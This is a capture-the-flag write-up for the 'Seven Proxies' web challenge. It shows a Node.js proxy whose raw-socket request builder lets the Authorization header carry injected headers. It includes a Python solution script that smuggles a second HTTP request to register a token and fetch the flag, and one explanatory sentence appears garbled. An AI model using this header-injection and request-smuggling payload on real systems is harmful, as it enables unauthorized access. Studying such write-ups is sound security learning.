# Seven Proxies

# Seven Proxies

### Description

My friend said that if we create two APIs and make the public one act as a proxy of other it would be unhackable. I don't think so. Can you help me out with this?

Here's Z endpoint monsieur

[http://64.227.131.98:40001/](http://64.227.131.98:40001/)

[secure-web-api.zip](https://hackcon.in/files/0bfb628b6e82969605c3911748b72826/secure-web-api.zip?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOjM1NSwiZmlsZV9pZCI6MjN9.ZOuJ-Q.ZMpbK00aD-Sl3tR4li6hTpqnU9I)

### Analysis

The application is what description says, there's frontend application which sends requests to backend and returns response from backend to us.

There's an extra file called `http-client.js`. The way function assembles request is injectable:

```js
export const request = async (url, options) => {
  const parsedUrl = new URL(url);

  const client = new Socket();
  client.setEncoding('utf8');
  client.connect(parsedUrl.port || 80, parsedUrl.hostname, () => {
    let request = '';
    request += `${options.method} ${parsedUrl.pathname + parsedUrl.search} HTTP/1.0\r\n`;
    request += `Host: ${parsedUrl.host}\r\n`;
    for (const header in options.headers) {
      if (header.includes('\r\n') || options.headers[header].includes('\r\n')) {
        continue;
      }
      request += `${header}: ${options.headers[header]}\r\n`;
    }
    if (options.body) {
      request += `Content-Type: text/plain\r\n`;
      request += `Content-Length: ${options.body.length}\r\n`;
    } else {
      request += `Content-Length: 0\r\n`;
    }
    request += `Connection: close\r\n`;
    request += `\r\n`;
    if (options.body) {
      request += options.body;
    }

    client.write(request);
  });

  let response = '';

  client.on('data', (data) => {
    response += data;
  });

  return new Promise((resolve, reject) => {
    client.on('error', (e) => {
      reject(e);
    });

    client.on('close', function () {
      resolve(parseResponse(response));
    });
  });
};
```

Headers are directly written inside request, the only filter is `\r` which is easily bypassed by just .\
For the exploit we have only 1 header:

```js
app.get("/flag", (req, res) => {
    if (!req.query.token) {
        res.status(500).send("[!] You need to provide a token");
        return;
    }

    request(`http://${process.env.SECURE_BACKEND}:9000/flag`, {
        method: "GET",
        headers: {
            Authorization: `Bearer ${req.query.token}`, // <-- Screaming for injection D:
        },
    })
        .then((response) => {
            res.send(response);
        })
        .catch((err) => {
            console.log(err);
            res.status(500).send("[!] Internal server error. The secure backend service crashed.");
        });
});
```

`Authorization` header will allow us to smuggle in other headers or data. Interesting enough we can actually smuggle inside another http request.

`/flag` is the target because it doesnt validate token, only register token does validation.

### Solution

```py
import requests

URL = 'http://64.227.131.98:40001'
TOKEN = "LETMEINNNN"

payload = f'''
{TOKEN}
Content-Length: 0
Connection: keep-alive

GET /register-token?token={TOKEN} HTTP/1.1
Host: localhost
'''.strip() # Remove extra whitespace

# Register token by smuggling second request
resp = requests.get(f"{URL}/flag", params={'token': payload})
# print(resp.json())

# Profit
resp = requests.get(f"{URL}/flag", params={'token': TOKEN})
print(resp.json()['body'])
```

### Note

Later on I found that this challenge actially was copy of [TeamItalyCTF (2022) FlagProxy](https://github.com/TeamItaly/TeamItalyCTF-2022/tree/master/FlagProxy)

Just glad that it wasn't 100% copy 💦
